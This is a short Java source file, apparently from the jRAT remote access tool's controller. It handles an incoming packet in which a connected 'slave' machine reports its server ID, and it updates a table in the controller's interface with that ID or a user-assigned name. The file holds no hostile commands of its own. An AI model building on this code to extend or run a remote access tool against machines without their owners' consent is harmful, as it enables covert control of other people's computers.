package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.settings.ServerID;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.io.DataInputStream;


public class Packet15InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setServerID(slave.readLine());
		ServerID.ServerIDEntry entry = ServerID.getGlobal().findEntry(slave.getRawIP());
		if (entry == null) {
			Frame.mainModel.setValueAt(slave.getServerID(), Utils.getRow(3, slave.getIP()), 1);
		} else {
			slave.setRenamedID(entry.getName());
			Frame.mainModel.setValueAt(slave.getRenamedID(), Utils.getRow(3, slave.getIP()), 1);
		}

	}
}
